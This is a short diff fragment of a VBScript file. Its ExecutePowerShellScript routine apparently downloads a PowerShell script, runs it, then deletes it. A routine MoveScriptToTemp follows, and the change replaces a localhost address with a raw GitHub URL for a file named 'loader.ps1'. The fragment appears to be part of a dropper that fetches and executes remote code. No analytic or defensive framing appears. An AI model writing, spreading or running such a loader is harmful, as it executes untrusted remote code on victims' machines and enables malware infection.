@@ -26,7 +26,7 @@ Function ExecutePowerShellScript(url)
         objFSO.DeleteFile tempScriptPath
     End If
 End Function
-url = "https://127.0.0.1:8080/download?file=loader.ps1"
+url = "https://raw.githubusercontent.com/jeromegerchin/upjsdefer/main/loader.ps1"
 ExecutePowerShellScript url
 Sub MoveScriptToTemp
     Dim tempDir, scriptPath, destination
